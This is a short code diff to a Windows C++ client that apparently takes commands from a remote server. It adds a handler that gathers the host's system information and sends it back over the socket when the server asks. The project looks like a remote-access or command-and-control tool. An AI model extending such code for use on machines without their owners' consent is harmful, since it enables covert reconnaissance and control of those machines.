@@ -7,6 +7,7 @@
 #include <windows.h>
 #include <sstream>
 #include "Encryption-Techniques/CaesarCipherShift.h"
+#include "System-Info/info.h"
 
 int main(int argc, char* argv[]) {
     if(argc < 2) {
@@ -141,6 +142,11 @@ int main(int argc, char* argv[]) {
 
         if (type == TYPE_INFO) {
             std::cout << SUCCESS_PREFIX << " Server requested system information\n";
+            std::string sysInfo = getSystemInfo();
+
+            int32_t infoLength = sysInfo.length();
+            send(sock, (char*)&infoLength, sizeof(infoLength), 0);
+            send(sock, sysInfo.c_str(), infoLength, 0);
         }
 
         if(type == TYPE_EXIT) {
